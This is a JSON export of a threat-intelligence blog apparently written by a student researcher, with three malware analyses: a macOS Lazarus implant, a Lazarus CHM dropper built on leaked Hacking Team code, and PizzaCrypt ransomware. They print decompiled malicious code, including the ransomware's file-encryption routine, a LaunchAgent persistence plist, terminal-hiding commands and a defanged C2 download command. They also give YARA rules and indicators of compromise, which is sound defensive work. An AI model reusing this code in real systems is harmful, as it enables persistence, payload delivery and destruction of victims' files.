[{"content":"","date":"13 May 2023","permalink":"/","section":"","summary":"","title":""},{"content":" 0. Summary # This post is an analysis of a previously unreported macOS implant which appears to be part of Lazarus\u0026rsquo; \u0026ldquo;Operation In(ter)ception\u0026rdquo; that was analyzed by SentinelOne in September 2022. This particular sample was uploaded to VirusTotal on Janurary 26, 2023 and has a number of similarites to the previously analyzed example.\nThis follows several high profile and prominent campaigns by North Korean actors involving the macOS platform. The most notable being the 3CX supply-chain attack, which was found to have a macOS component (Partick Wardle did a fantastic analysis). JAMF also recently reported on some new Mac malware called RustBucket, which is also attributed to North Korean threat actors.\nThis malware is delivered under the guise of a crypto.com job posting and has at least 3 stages. It establishes persistence using a LaunchDaemon and is capable of downloading and running further malware from a C2 server.\nAll of the decompiled code, YARA rules, and Binary Ninja databases can be found on my Github.\n1. First Stage # Trait Value Name CryptoComJD.zip MD5 f764c707500e7a54db9830741d3a36bf SHA-1 f2edce988fda14e3c113eb1ef020e8a7f15e371d SHA-256 a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec The malware was delivered in a file called CryptoComJD.zip - the distribution method is unknown at this time. The PDF included in the ZIP is actually part of the first stage executable and is opened during runtime. It is 25 pages long and contains a number of crypto related job descriptions. It is the same lure that was used in the Operation In(ter)ception report. Fig 1: PDF Job Lure 2. Second Stage # Trait Value Name CryptoComJobOpportunities.pdf MD5 d1c064a698dc3b3414313d9f9e33b73b SHA-1 331f11417b11350aef9705791ff765d232f816bf SHA-256 8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0 2.1 - Preliminary Analysis # Despite the name, this file is a Mach-O universal binary, which means both arm64 and x86 versions are contained in a single executable.\n➜ stage1 file sample-fat-file sample-fat-file: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64] sample-fat-file (for architecture x86_64):\tMach-O 64-bit executable x86_64 sample-fat-file (for architecture arm64):\tMach-O 64-bit executable arm64 In order to more easily examine this, we can use the tool lipo to extract the build for a particular architecture:\n➜ stage1 lipo sample-fat-file -thin arm64 -output stage1-arm After binwalking extracted file we can see some other interesting things, particularly that there is a .app archive and another Mach-O included.\n➜ stage1 binwalk stage1-arm DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 1276 0x4FC Unix path: /usr/lib/dyld 33032 0x8108 gzip compressed data, from Unix, last modified: 2022-09-22 01:02:02 45151 0xB05F PDF document, version: \u0026#34;1.5\u0026#34; 46188 0xB46C JPEG image data, JFIF standard 1.01 48916 0xBF14 Zlib compressed data, default compression 50863 0xC6AF JPEG image data, JFIF standard 1.01 72205 0x11A0D Zlib compressed data, default compression ... ommited extra Zlip entires 706365 0xAC73D Zlib compressed data, default compression 710555 0xAD79B gzip compressed data, from Unix, last modified: 2022-09-22 00:47:49 757096 0xB8D68 XML document, version: \u0026#34;1.0\u0026#34; 779039 0xBE31F XML document, version: \u0026#34;1.0\u0026#34; 2.2 - Static Analysis # Now that we have a standalone executable, we can start with static analysis. Opening up the stage1-arm file in Binary Ninja, we can see that the sample is not stripped (slay).\nFunction list:\nAddress Name 0x100002c6c int64_t ExecuteFile(int64_t arg1) 0x100002cd0 int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3) 0x100002e08 int64_t pclose2(int64_t arg1) 0x100002e10 int64_t Shell(int64_t arg1, int64_t arg2) 0x100002f8c void strreverse(char* arg1, int64_t arg2) 0x100002fbc void itoa(int64_t arg1, char* arg2, int32_t arg3) 0x100003054 int64_t startDaemon() 0x1000032cc int64_t IsSafariFAExist() 0x100003358 int64_t thExec() 0x100003790 char* GetUserName() 0x100003838 int64_t _main() 2.2.1 - Main # The actual main function is pretty long, not because it is complex but because there is a ton of string construction going on. This is because the executable makes frequent use of bash/zsh commands through a helper method called Shell(). Main starts off by attempting to hide these commands by running a few printf statements to modify the shell window:\n_printf(\u0026#34;\\x1b[3J\u0026#34;); // clears the entire screen and deletes all lines saved in the scrollback buffer _printf(\u0026#34;\\x1b[8;1;1t\u0026#34;); // resize the terminal window to 1x1 _printf(\u0026#34;\\x1b[2t\u0026#34;); // minimize the window Shell(\u0026#34;printf \u0026#39;\\x1b[8;1;1t\u0026#39; \u0026amp;\u0026amp; printf \\\u0026#39;\\x1b[2t\\\u0026#39;\u0026#34;, 0); // use shell helper to again resize the window and minimize Next, a few strings are built using a series of strcats and strcpys.\na filepath: /Users/{username}/Library/DiagnosticsPeer/CryptoComJobOpportunities.pdf a bash command: open \\\u0026#39;{filepath}\\\u0026#39; \u0026amp;\u0026amp; rm -rf \\\u0026#39;/Users/{username}/Library/Saved Application State/com.apple.Terminal.savedState\\\u0026#39; The embedded PDF file is written to the location above and the bash command is executed. The bash command opens the PDF and deletes the terminal history. This gives the impression that the double-clicked file is actually a PDF and not an executable.\nFILE *filepath_fp = _open(\u0026amp;filepath, 0x201); if (filepath_fp == 0) { _write(); _close(filepath_fp); Shell(\u0026amp;command, 0); ... Finally, thExec() and then a check against the killswitch are called. If the next stage is already found to be running, execution will stop.\n//cont... thExec(); if (IsSafariFAExist() == 1) { _g_d = 1; } Shell(\u0026#34;killall Terminal\u0026#34;, 0); } 2.2.2 - Killswitch # The function IsSafariFAExist() is a killswitch to prevent installation if the next stage is already running on the host. It uses the Shell() helper function to execute pgrep which searches for the running process diageventagent. This function is checked a few times in: main, thExec, and startDaemon. The behavior of exiting if the function returns true is consistent.\nint int_conv_of_pgrep_output; int return_val; char* outcome_of_pgrep; memset(outcome_of_pgrep, 0, 0x64); Shell(\u0026#34;pgrep -f diageventagent\u0026#34;, \u0026amp;outcome_of_pgrep); if (outcome_of_pgrep != 0) { int_conv_of_pgrep_output = _atoi(\u0026amp;outcome_of_pgrep); if (int_conv_of_pgrep_output \u0026gt; 0) { return_val = 1; } } if (((outcome_of_pgrep == 0) || (outcome_of_pgrep != 0 \u0026amp;\u0026amp; int_conv_of_pgrep_output \u0026lt;= 0)) { return_val = 0; } return return_val; 2.2.3 - thExec() # This function is responsible for writing the included .app archive and subsequent executables to dist as well as triggering the persistence mechanism. Just like main it makes heavy use of Shell() and most of it\u0026rsquo;s length comes from the tedious tedious string building.\nThere are 5 main strings built:\nA source path: /Users/{username}/Library/DiagnosticsPeer/diageventagent_ A destination path: /Users/{username}/Library/DiagnosticsPeer/diageventagent A temp path: /Users/{username}/Library/DiagnosticsPeer/diagevent_ Command 1:tar zxvf \\'{temp}\\' -C \\'{dest}\\' Command 2: open -a \\'{dest}/diageventd.app\\' The core logic of this function is quite short and centers around checking against the killswitch before triggering the persistence mechanism.\nif (IsSafariFAExist() == 1) { Shell(\u0026#34;killall Terminal\u0026#34;, 0); } else { if (IsSafariFAExist() == 0) { int32_t x0_45; // killswitch status do { Shell(\u0026amp;command2, 0); startDaemon(); _sleep(1); _g_c = 1; // global state variable x0_45 = IsSafariFAExist(); } while (x0_45 == 0); } if (_access(\u0026amp;dest, 0) != 0xffffffff) { _g_e = 1; // global state variable } } 2.2.4 - Persistence # The startDaemon() function is how this malware establishes persistence. It does so through a LaunchAgent daemon called \u0026ldquo;iTunes_trush\u0026rdquo; (banger playlist name).\nThe general flow of this function is:\nCreate directory in /Users/{username}/Library/LaunchAgents/ Create plist file in /Users/{username}/Library/LaunchAgents/com.diagnosticspeer.plist Create filepath string for second stage executable: /Users/{username}/Library/DiagnosticsPeer/diageventagent Write second stage executable. The following is the contents of the written plist file. It is setup so that launchd will runs the executable diageventagent at system boot.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;iTunes_trush\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;OnDemand\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;string\u0026gt;/Users/{username}/Library/DiagnosticsPeer/diageventagent\u0026lt;/string\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; 3. Third Stage # Trait Value Name diageventagent MD5 edc8136611b90ea492830adde099b1a6 SHA-1 1104a10689f4887ea9bba47fe3e115e271414fbe SHA-256 fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 3.1 - Preliminary Analysis # Again, this file is a Mach-O universal binary so we repeat the process of extracting a particular build for the purposes of analysis. I chose the ARM version for consistency.\n➜ stage2 file fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64] fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 (for architecture x86_64):\tMach-O 64-bit executable x86_64 fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 (for architecture arm64):\tMach-O 64-bit executable arm64 ➜ stage2 lipo fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 -thin arm64 -output stage2-arm-sample 3.2 - Static Analysis # After opening up this file in Binja we can see that it is also not stripped and shares a number of similarities with the previous stage.\nFunction list:\nAddress Name 0x100002c3c int64_t ExecuteFile(int64_t arg1) 0x100002c90 int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3) 0x100002dc8 int64_t pclose2(int64_t arg1) 0x100002dd0 int64_t Shell() 0x100002f58 int64_t write_data() 0x100002f5c int64_t DownloadFile() 0x10000367c void strreverse(char* arg1, int64_t arg2) 0x1000036ac void itoa(int64_t arg1, char* arg2, int32_t arg3) 0x100003744 int64_t cp() 0x1000038d0 int64_t _main() 3.2.1 - Main # Shocker this main also is mostly just string building. This stage also preodically checks in with the C2 server to try and download a payload located at https[:]//capitalzeroco.com/{user's UID}.png. If the file is found, it would be written to /Users/{username}/\u0026quot;/Library/DiagnosticsPeer/AppStore.\nIt then drops into the following infinite loop:\nwhile (true) x0_10 = DownloadFile() if (x0_10 != 0) break _sleep(0x4b0) if (x0_10 == 1) ExecuteFile(\u0026amp;filepath) while (true) _sleep(0x4b0) 3.2.2 - Download File # Then libcurl to build a curl command that would be equivalent to:\ncurl -X GET \u0026#34;https[:]//capitalzeroco[.]com?response=\u0026lt;response_data\u0026gt;\u0026#34; \\ -H \u0026#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\u0026#34; \\ -H \u0026#34;Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8\u0026#34; If there is a successful download, it would try to perform the following command using the Shell() helper:\ntar zxvf \\\u0026#39;{}\\\u0026#39; -C \\\u0026#39;{new file}\\\u0026#39;\u0026#34; 4. Infrastructure Analysis # The C2 domain in this sample is capitalzeroco[.]com and currently points to the domain 172[.]93[.]201[.]106. It is currently running Microsoft IIS and has RDP exposed. This means that this host is most likely a compromised asset making pivoting off this particular infra difficult.\nThe domain was registered on Porkbun which is a favorite of\n5. Appendix # 5.1 - YARA Rules # rule operation_intercept_macos_stage1 { meta: description = \u0026#34;Detecting persistence of macOS persistence Lazarus\u0026#34; author = \u0026#34;@birchb0y\u0026#34; reference = \u0026#34;\u0026#34; date = \u0026#34;2023-13-05\u0026#34; strings: $persist1 = \u0026#34;com.diagnosticspeer.plist\u0026#34; $persist2 = \u0026#34;DiagnosticsPeer\u0026#34; $persist3 = \u0026#34;pgrep -f diageventagent\u0026#34; $persist4 = \u0026#34;diageventagent_\u0026#34; $persist5 = \u0026#34;diagevent_\u0026#34; $persist6 = \u0026#34;diageventagent\u0026#34; $persist7 = \u0026#34;diageventd.app\u0026#34; $plist1 = \u0026#34;iTunes_trush\u0026#34; $plist2 = \u0026#34;OnDemand\u0026#34; $plist3 = \u0026#34;RunAtLoad\u0026#34; $plist4 = \u0026#34;KeepAlive\u0026#34; condition: any of ($persist*) or all of ($plist*) } rule operation_intercept_stage2 { meta: description = \u0026#34;\u0026#34; author = \u0026#34;@birchb0y\u0026#34; reference = \u0026#34;\u0026#34; date = \u0026#34;2023-13-05\u0026#34; strings: $string1 = \u0026#34;DiagnosticsPeer\u0026#34; $string2 = \u0026#34;capitalzeroco.com\u0026#34; $curl1 = \u0026#34;Mozilla/5.0+(Macintosh;Intel+Mac+OS+X+12_4)+AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\u0026#34; $curl2 = \u0026#34;Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8\u0026#34; condition: any of ($string*) or all of ($curl*) } 5.2 - IOCs # Files\nName SHA-256 CryptoComJobOpportunities.pdf 8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0 diageventagent fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 CryptoComJD.zip a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec Infrastructure\nDomain IP capitalzeroco[.]com 172[.]93[.]201[.]106 ","date":"13 May 2023","permalink":"/posts/crypto-workers-wanted/","section":"Posts","summary":"An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus\u0026rsquo; Operation Interception.","title":"Crypto Workers Wanted"},{"content":"","date":"13 May 2023","permalink":"/tags/cti/","section":"Tags","summary":"","title":"CTI"},{"content":"","date":"13 May 2023","permalink":"/tags/lazarus/","section":"Tags","summary":"","title":"Lazarus"},{"content":"","date":"13 May 2023","permalink":"/tags/macos/","section":"Tags","summary":"","title":"macOS"},{"content":"","date":"13 May 2023","permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware"},{"content":"","date":"13 May 2023","permalink":"/tags/north-korea/","section":"Tags","summary":"","title":"North Korea"},{"content":"","date":"13 May 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"13 May 2023","permalink":"/tags/re/","section":"Tags","summary":"","title":"RE"},{"content":"","date":"13 May 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"hey! My name is alden (or birch) and I\u0026rsquo;m currently:\nCS undergrad @ UMD FIRE @ Yahoo (standard disclaimer: these thoughts are my own and do not represent those of my employer) VP and Competition Team Lead for UMDCSEC interested in malware, reverse engineering, threat intel the font used on this site is Berkeley Mono\n","date":"3 January 2023","permalink":"/about/","section":"","summary":"hey! My name is alden (or birch) and I\u0026rsquo;m currently:\nCS undergrad @ UMD FIRE @ Yahoo (standard disclaimer: these thoughts are my own and do not represent those of my employer) VP and Competition Team Lead for UMDCSEC interested in malware, reverse engineering, threat intel the font used on this site is Berkeley Mono","title":"About"},{"content":" Why make malware when Hacking Team can do it for you - Lazarus (probably)\nBackground # About a week ago, I made this absolute banger of a tweet to tease this blog post.\napts rlly be like pic.twitter.com/Lb3tIqBfdS\n\u0026mdash; birch (@birchb0y) December 13, 2022 On 12/09/2022, the following crypto themed CHM file was submitted to VirusTotal by a South Korean user. This got me all excited because it SCREAMS Lazarus. ZScaler did a lovely writeup1 on a very similar campaign in April.\nFig 1: VirusTotal submission Technical Analysis # Stage 1: Dropper # We start off with a Compiled HTML Help (CHM) file, which is essentially a way of showing HTML natively on the desktop. Since CHM files are just archives, they can be decompiled(?) using 7-Zip allowing us to view the bundled content. If the victim opens wallet.chm they will see the following article about Bitcoin ( translated):\nFig 2: Opened CHM File After extracting the bundled content we can see a number of files, the most important being: page_1.html and the src directory.\nThe content displayed in Fig: 1 is actually just a rendered version of page_1.html, and like any other HTML file, it can execute JavaScript. At the end of page_1.html we find some packed JS:\nFig 4: Packed JavaScript in CHM file This specific JS packer has been noted in a number of NK attributed samples, and is trivial to unpack. Instead of returning the decoded function you can simply print the unpacked result.\nFig 5: Unpacking JS using the console And after beautifying:\nFig 6: Beautified unpacked JS The function jmpof09fds() gets the location of the CHM file on disk to prepare for writing the next stage. The variable jdeDc05a is just a URL encoded script which after being decoded is a shortcut for decompiling wallet.chm to expose hkcmds.exe to disk:\nFig 7: Beautified payload Following the JS pictured in Fig: 4, there is some more code to execute the file hkcmds.exe that was included in the bundle.\nFig 8: Other shortcut created At this point, we\u0026rsquo;re done with the CHM file as all the prep work for stage two has been completed. We can now move onto analyzing hkcmds.exe.\nStage 2: hkcmds.exe # Throwing the binary into DetectItEasy shows it is a C/C++ binary with no packing (🥵). No extra steps necessary and we can continue on to our analysis in IDA.\nFig 9: DIE output for hkcmds.exe IDA helpfully identifies WinMain for us, so we start there. The first thing that jumps out is a number of obfuscated strings that are being fed into sub_4018A0().\nFig 10: WinMain decompilation Examining the rest of the strings in the binary, we notice that there are tons of similarly obufscated strings. Just like the ones we saw above, they are all referenced by sub_4018A0. During a quick debug, we can see that sub_4018A0, miraculously returns a normal WinAPI function call! Interestingly, there are a lot similarities among the lines which means that it is probably some simple debofuscation happening.\n... MpdbmBmmpd HfuMbtuFssps Qspdftt43Ofyu Npevmf43Ofyu Npevmf43Gjstu Qspdftt43Gjstu DsfbufUppmifmq43Tobqtipu HfuQspdBeesftt GjoeGjstuGjmfB HfuFowjsponfouWbsjbcmfB HfuGjmfJogpsnbujpoCzIboemf MpbeMjcsbszB Qspdftt43OfyuX Qspdftt43GjstuX GsffMjcsbsz HfuDvssfouQspdftt ... For kicks, I threw a few of the strings into Google and was met with this\u0026hellip; https://github.com/hackedteam/core-win32/blob/master/DynamiCall/obfuscated_calls.h and all the mappings of obfuscated function calls. thanks bestie!! 🥰 Making use of Hacking Team implants like a good APT should.\nFig 11: obfuscated_calls.h This was a great find as the repo contains source for the binary we were about to reverse! In terms of the function obfucsation, it ends up just shifting all the characters by -1. It would be a fair assumption to make that the binary we are reversing is just the RCS (remote control system) in this repo but there are some inconsistencies.\nTo make the process a little easier, I wrote a quick deobfuscation script to fix up the function calls in IDA.\nimport idc import idautils import idaapi def deobfuscate(obfuscated) -\u0026gt; str: return \u0026#34;\u0026#34;.join([chr(ord(i)-1) for i in str(obfuscated)]) def iterate_strings(start_addr, end_addr): for i in idautils.Strings(): # Check if the string is within the specified range if i.ea \u0026gt;= start_addr and i.ea + i.length \u0026lt;= end_addr: # Get the string content print(f\u0026#34;String at {hex(i.ea)}: {deobfuscate(i)}\u0026#34;) idaapi.patch_bytes(i.ea, bytes(deobfuscate(i), \u0026#39;utf-8\u0026#39;)) def main(): start_addr = 0x00411A68 # Start address of obfuscation strings end_addr = 0x0041322E # End address of obfuscation strings iterate_strings(start_addr, end_addr) main() In terms of similarities, the function sub_401260 which is passed to the new thread in WinMain bears resemblence to PollClipBoard in HM_ClipBoard.h. Accounting for some structural weirdness in the decompilation, these two share a very similar strcuture. With a large loop that GetsClipboardData and then batches it to send off.\nFig 12: Clipboard capture decompilation Fig 13: Source for PollClipBoard WinMain doesn\u0026rsquo;t have any comparable code in the Hacking Team repo, so my assumption is that hkcmds.exe is some modified or newer version. There are also some obvious mismatches like no entry for CreateThread in obfuscated_calls.h but uses of it in hkcmds.exe. I\u0026rsquo;m going to continue analysis on this sample further, but it is interesting to see the use of Hacking Team tools by possible nation state actors.\nConclusion # The case for attributing this malware to Lazarus or some other North Korean actor is fairly strong. Taking into consideration the locality of the submitter, the content of the document, the use of a CHM file for delivery, utilizing leaked tooling, and Akamai for infrastructure hosting; all line up with previous reports on recent Lazarus activity.\nThis is the first post like this I\u0026rsquo;ve done in a while so if you have any feedback I\u0026rsquo;d love to hear it! Feel free to hit me up on any of my linked socials (Discord: birch#9901). Thanks for reading!\nIOCs # Hashes # File Name SHA256 wallet.chm 96f144e71068bc98c5e73d396738d22a948d3a5e2d20ba618b5a0a758c0a7a89 hkcmds.exe 442769ddce07457c55fa2eb61b145f6ad91cc1155fc2124b275e0acaf4029e2c IPs # IP 23[.]216[.]147[.]64 References # https://www.zscaler.com/blogs/security-research/naver-ending-game-lazarus-apt\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"18 December 2022","permalink":"/posts/lazarus-loves-crypto/","section":"Posts","summary":"A quick analysis of Lazarus sample which makes use of Hacking Team tools from the 2017 leak.","title":"Lazarus Using Leaked Hacking Team Tooling"},{"content":"","date":"7 September 2022","permalink":"/tags/.net/","section":"Tags","summary":"","title":".NET"},{"content":" Background # I was scrolling through twitter when I saw this post from @siri_urz:\n.pizza PizzaCrypt #Ransomware\nC:\\Users\\Костя\\source\\repos\\PizzaRansom\\PizzaRansom\\obj\\Debug\\1.pdb\n950EC0AD0F3C899B672063E1C56FF1F2 pic.twitter.com/zIyNfQhd4G\n\u0026mdash; S!Ri (@siri_urz) September 7, 2022 As a fan of goofy ransomware, I couldn’t resist looking at this. Obviously this isn\u0026rsquo;t some sick APT malware but I\u0026rsquo;ve been meaning to write-up more stuff and this seemed like a good exercise. It\u0026rsquo;s a non-obfuscated .NET application so the \u0026ldquo;RE\u0026rdquo; process should be pretty quick! I\u0026rsquo;ve included the binary and all decompiled source on my GitHub.\nIn 2019 another ransomware program PizzaCrypts1 did the rounds, but this appears to be unrelated.\nTechnical Analysis # Examining Main the first thing that stands out is a kill-switch, which checks for the presence of \u0026quot;C:\\\\protect.dat\u0026quot; and will cease execution if found.\nbool flag = File.Exists(\u0026#34;C:\\\\protect.dat\u0026#34;); if (flag) { Application.Exit(); Process.GetCurrentProcess().Kill(); Thread.Sleep(-1); } We then proceed onto another flag check, this time confirming if g is supplied as an argument. In that case it will set the global variablesProgram.PersonalID and Program.KeyHash to the values stored in piz.za and pi.zza respectively.\nbool flag2 = args.Length != 0 \u0026amp;\u0026amp; args[0] == \u0026#34;g\u0026#34;; if (flag2) { Program.PersonalID = File.ReadAllBytes( Path.Combine( Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData), \u0026#34;piz.za\u0026#34;)); Program.KeyHash = File.ReadAllBytes( Path.Combine( Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData), \u0026#34;pi.zza\u0026#34;)); } Then we get to the meat of the ransomware, the encryption/decryption routine. It\u0026rsquo;s realtively simple and makes use of a hardcoded key. This is presumably becuase the operator has the private key and will use that to decrypt in the end. It is important to note that no new key is actually generated here.\nbyte[] key = Program.GenerateSalt(64); GCHandle gchandle = GCHandle.Alloc(key, GCHandleType.Pinned); using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider()) { rsacryptoServiceProvider.ImportParameters(new RSAParameters { Modulus = Convert.FromBase64String( \u0026#34;8AacrrnhQdq6IGyOxFlSptFtMmo8VmdX64TZg4Yha3LLHSVinmuV6XXnVEPzJhCI7r7VAOERAEaj/xopNcnmGzRKhK4myQQbaPujznLlBvWZHDrlS8HDNwhB/vNr+m95k+ZntXpuFo/9g8VsKi3SWHVT4kr4HVokzpdWHZtfCQk=\u0026#34;), Exponent = Convert.FromBase64String(\u0026#34;AQAB\u0026#34;) // 65537 }); Program.PersonalID = rsacryptoServiceProvider.Encrypt(key, false); Program.KeyHash = SHA256.Create().ComputeHash(key); } After the RSA object has been setup, it writes to those files we talked about earlier which store this specific instance\u0026rsquo;s keys.\nProgram.EncryptAll(array); Program.ZeroMemory(gchandle.AddrOfPinnedObject(), array.Length); gchandle.Free(); File.WriteAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), \u0026#34;piz.za\u0026#34;), Program.PersonalID); File.WriteAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), \u0026#34;pi.zza\u0026#34;), Program.KeyHash); Process.Start(Application.ExecutablePath, \u0026#34;g\u0026#34;); Lastly, we see the actual encryption routine. It recurses through the file system and encrypts each file using the key set above. It also adds the .pizza extension to all the files that it encrypted.\nprivate static void EncryptFile(string file, byte[] password) { using (FileStream fileStream = new FileStream(file + \u0026#34;.pizza\u0026#34;, FileMode.Create)) { using (RijndaelManaged rijndaelManaged = new RijndaelManaged()) { byte[] array = Program.GenerateSalt(32); fileStream.Write(array, 0, array.Length); Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, array, 3); rijndaelManaged.KeySize = 256; rijndaelManaged.BlockSize = 128; rijndaelManaged.Padding = PaddingMode.PKCS7; rijndaelManaged.Mode = CipherMode.CFB; rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8); rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8); using (CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write)) { using (FileStream fileStream2 = new FileStream(file, FileMode.Open)) { byte[] array2 = new byte[10485760]; int count; while ((count = fileStream2.Read(array2, 0, array2.Length)) \u0026gt; 0) { cryptoStream.Write(array2, 0, count); } } } } } } The decryption routine for this program is exactly the same but makes use of the private key. Overall, there really isn\u0026rsquo;t much to this ransomware.\nWhere did this sample come from? # One of the strings that really sticks out in this binary is the source path: \u0026ldquo;C:\\Users\\Костя\\source\\repos\\\u0026rdquo;. After searching for other submissions that might feature the same info, we come across some very interesting results. We can see that this build path is found in quite a few other samples:\nEliteVirusGenerator.exe Crapsomware.exe not a viruz.exe /freecsgodownloadnovirus/freecsgodownloadnovirus.github.io/main/csgo.exe These all seem like they were written in jest, which tracks with PizzaCrypt. There really isn\u0026rsquo;t any major concern here - was mostly just an interesting exercise in quick and dirty RE with some rough attribution.\nIOCs # File Name SHA256 1.exe a0aafb46fcdbc528925dea8783fa348bb1df49fa4ff216136f32d708d7605b6f References # https://minerva-labs.com/blog/did-someone-order-pizzacrypts/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"7 September 2022","permalink":"/posts/pizzacrypt-analysis/","section":"Posts","summary":"A quick analysis of some fun .NET ransomware with a goofy ransom note.","title":"PizzaCrypt Analysis"},{"content":"","date":"7 September 2022","permalink":"/tags/ransomware/","section":"Tags","summary":"","title":"ransomware"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]